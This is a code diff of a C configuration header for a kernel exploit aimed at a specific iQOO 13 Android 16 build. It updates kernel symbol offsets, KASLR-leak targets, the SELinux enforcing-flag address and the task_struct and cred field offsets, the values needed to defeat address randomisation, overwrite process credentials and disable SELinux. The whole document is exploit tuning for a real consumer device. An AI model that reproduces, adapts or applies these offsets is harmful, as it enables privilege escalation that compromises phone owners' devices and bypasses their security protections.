@@ -4,15 +4,19 @@
 /*
  * Target: iQOO 13 (I2401)
  * SoC:    Qualcomm Snapdragon 8 Elite (SM8750)
- * Kernel: 6.6.127-android15
+ * Kernel: 6.6.127-android15-8-gf0987337fa35-ab15756704-4k
+ * ROM:    PD2408CF_EX_A_16.1.23.0.W20 (vivo/iQOO OTA, Android 16)
  * Build:  iQOO 13 (kernel 6.6.127 variant)
  *
- * Symbols extracted from kernel 6.6.127 offsets.
- * Struct offsets verified and adapted from 6.6.89 baseline.
+ * Symbol offsets below are taken verbatim from offsets_6.6.127.h
+ * (verified 6.6.127 symbol dump for this exact build).
+ * Struct/field offsets are kept from the 6.6.89 GKI baseline:
+ * android15-6.6 GKI KMI is frozen, so task_struct / cred /
+ * rt_mutex_waiter layouts are identical between 6.6.89 and 6.6.127.
  */
 
 #define BUILD_VARIANT_LABEL "i2401_sm8750_truephone_6.6.127"
-#define BUILD_FINGERPRINT "iQOO/I2401/I2401:16/6.6.127/compiler:user/release-keys"
+#define BUILD_FINGERPRINT "iQOO/I2401T/I2401:16/PD2408CF_EX_A_16.1.23.0.W20/compiler260806103940:user/release-keys"
 
 /* ── Memory layout ─────────────────────────────────────────────────────── */
 /* DTB: memory { reg = <0x00 0x80000000 0x00 0x40000000>; }               */
@@ -28,41 +32,42 @@
 
 
 /* ── Core kernel symbols (image-relative offsets) ───────────────────────── */
+/* All values below verified against offsets_6.6.127.h.                      */
 
 /* ashmem */
-#define ASHMEM_MISC_FOPS_OFF         0x0225b3e8ULL  /* &ashmem_misc+0x10    */
-#define ASHMEM_FOPS_OFF              0x012dbe98ULL  /* ashmem_fops struct   */
-#define ASHMEM_IOCTL_OFF             0x00c7f754ULL
-#define ASHMEM_COMPAT_IOCTL_OFF      0x00c7fe10ULL
-#define ASHMEM_MMAP_OFF              0x00c7fe64ULL
-#define ASHMEM_OPEN_OFF              0x00c80084ULL
-#define ASHMEM_RELEASE_OFF           0x00c8010cULL
-#define ASHMEM_SHOW_FDINFO_OFF       0x00c80198ULL
+#define ASHMEM_MISC_FOPS_OFF         0x0229c428ULL  /* ashmem_misc + 0x10   */
+#define ASHMEM_FOPS_OFF              0x012f9788ULL  /* ashmem_fops struct   */
+#define ASHMEM_IOCTL_OFF             0x00c90f04ULL
+#define ASHMEM_COMPAT_IOCTL_OFF      0x00c915c0ULL
+#define ASHMEM_MMAP_OFF              0x00c91614ULL
+#define ASHMEM_OPEN_OFF              0x00c91834ULL
+#define ASHMEM_RELEASE_OFF           0x00c918bcULL
+#define ASHMEM_SHOW_FDINFO_OFF       0x00c91948ULL
 
 /* configfs */
-#define CONFIGFS_READ_ITER_OFF       0x0048bd6cULL
-#define CONFIGFS_BIN_WRITE_ITER_OFF  0x0048c298ULL
+#define CONFIGFS_READ_ITER_OFF       0x00492078ULL
+#define CONFIGFS_BIN_WRITE_ITER_OFF  0x004925a4ULL
 
 /* generic VFS helpers                                                        */
-#define COPY_SPLICE_READ_OFF         0x0041058cULL
-#define NOOP_LLSEEK_OFF              0x003c332cULL
+#define COPY_SPLICE_READ_OFF         0x004157d0ULL
+#define NOOP_LLSEEK_OFF              0x003c8548ULL
 
 /* core scheduler / init */
-#define INIT_TASK_OFF                0x020fe280ULL
-#define ROOT_TASK_GROUP_OFF          0x022f5580ULL
+#define INIT_TASK_OFF                0x0213e080ULL
+#define ROOT_TASK_GROUP_OFF          0x02338780ULL
 
 /* SELinux                                                                    */
 /* selinux_state is the struct; byte 0 is the enforcing flag (see             */
 /* sel_read_enforce: LDRB W3,[X8,#selinux_state@PAGEOFF])                    */
-#define SELINUX_BLOB_SIZES_OFF       0x016626f0ULL
-#define SELINUX_ENFORCING_OFF        0x02336ea0ULL  /* = selinux_state addr  */
-#define SECURITY_HOOK_HEADS_OFF      0x01661fb8ULL
+#define SELINUX_BLOB_SIZES_OFF       0x01687df0ULL
+#define SELINUX_ENFORCING_OFF        0x0237a0e8ULL  /* = selinux_state addr  */
+#define SECURITY_HOOK_HEADS_OFF      0x016876b8ULL
 
 /* slab allocator                                                             */
-#define KMALLOC_CACHES_OFF           0x01661af8ULL
+#define KMALLOC_CACHES_OFF           0x016871f8ULL
 
 /* pipe                                                                       */
-#define ANON_PIPE_BUF_OPS_OFF        0x0115ba88ULL
+#define ANON_PIPE_BUF_OPS_OFF        0x01178408ULL
 
 /* ── Computed kernel addresses ─────────────────────────────────────────── */
 #define ASHMEM_MISC_FOPS   (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
@@ -86,16 +91,17 @@
 #define ANON_PIPE_BUF_OPS  (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
 
 /* ── SLIDE (KASLR leak) targets ─────────────────────────────────────────── */
-/* UPDATED FOR KERNEL 6.6.127 - Offsets verified from offsets_6.6.127.h    */
-#define SLIDE_NFULNL_LOGGER_OFF          0x020f2ae8ULL  /* nfulnl_logger - UPDATED */
-#define SLIDE_LOGGERS_0_1_OFF            0x020f2a38ULL  /* loggers[0] slot - UPDATED */
-#define SLIDE_RANDOM_BOOT_ID_DATA_OFF    0x02219b58ULL  /* random_table boot_id .data - UPDATED */
-#define SLIDE_NFULNL_LOG_PACKET_OFF      0x00e50dd8ULL  /* nfulnl_log_packet - UPDATED */
+/* From offsets_6.6.127.h: nfulnl_logger, loggers, nfulnl_log_packet,        */
+/* sysctl_bootid; boot_id .data = random_table + 0x108.                      */
+#define SLIDE_NFULNL_LOGGER_OFF          0x02132060ULL  /* nfulnl_logger     */
+#define SLIDE_LOGGERS_0_1_OFF            0x02131fa8ULL  /* loggers[0] slot   */
+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF    0x02259310ULL  /* random_table[4].data */
+#define SLIDE_NFULNL_LOG_PACKET_OFF      0x00e667ecULL  /* nfulnl_log_packet */
 #define SLIDE_BOOTID_LEAK_SOURCE_OFF     (SLIDE_NFULNL_LOGGER_OFF + 0x10ULL)
 #define SLIDE_BOOTID_LEAK_VALUE_OFF      SLIDE_NFULNL_LOG_PACKET_OFF
 #define SLIDE_INIT_TASK_OFF              INIT_TASK_OFF
 #define SLIDE_ROOT_TASK_GROUP_OFF        ROOT_TASK_GROUP_OFF
-#define SLIDE_SYSCTL_BOOTID_OFF          0x0235b128ULL  /* sysctl_bootid UUID - UPDATED */
+#define SLIDE_SYSCTL_BOOTID_OFF          0x0239b0f0ULL  /* sysctl_bootid UUID */
 
 #define SLIDE_NFULNL_LOGGER_IMAGE  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
 #define SLIDE_LOGGERS_0_1_IMAGE    (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
@@ -156,15 +162,15 @@
 #define CFG_CB_MAX_SIZE_OFF       100
 
 /* ── task_struct field offsets ──────────────────────────────────────────── */
-/* NOTE: 6.6.127 offsets differ from 6.6.89 */
+/* GKI android15-6.6 KMI frozen: identical layout to 6.6.89.                */
 #define MM_OWNER_OFF           1032
 #define TASK_PID_OFF           0x618
 #define TASK_TGID_OFF          0x61c
 #define TASK_REAL_PARENT_OFF   0x628
 #define TASK_ATOMIC_FLAGS_OFF  0x5d8
-#define TASK_REAL_CRED_OFF     0xad8  /* Updated for 6.6.127 */
-#define TASK_CRED_OFF          0xae0  /* Updated for 6.6.127 */
-#define TASK_COMM_OFF          0xaf0  /* Updated for 6.6.127 */
+#define TASK_REAL_CRED_OFF     0x818
+#define TASK_CRED_OFF          0x820
+#define TASK_COMM_OFF          0x830
 #define TASK_TASKS_OFF         0x550
 #define TASK_THREAD_INFO_FLAGS_OFF 0x00
 #define TASK_SECCOMP_OFF       0x8e8
@@ -177,7 +183,7 @@
 /* ── cred structure offsets ─────────────────────────────────────────────── */
 #define CRED_UID_OFF           8
 #define CRED_SECUREBITS_OFF    40
-#define CRED_CAPS_OFF          0x20  /* Updated for 6.6.127 */
+#define CRED_CAPS_OFF          48    /* cap_* block at 0x30 in GKI 6.6 cred */
 #define CRED_SECURITY_OFF      128
 #define SELINUX_CRED_BLOB_OFF  0
 #define SELINUX_CRED_OSID_OFF  0
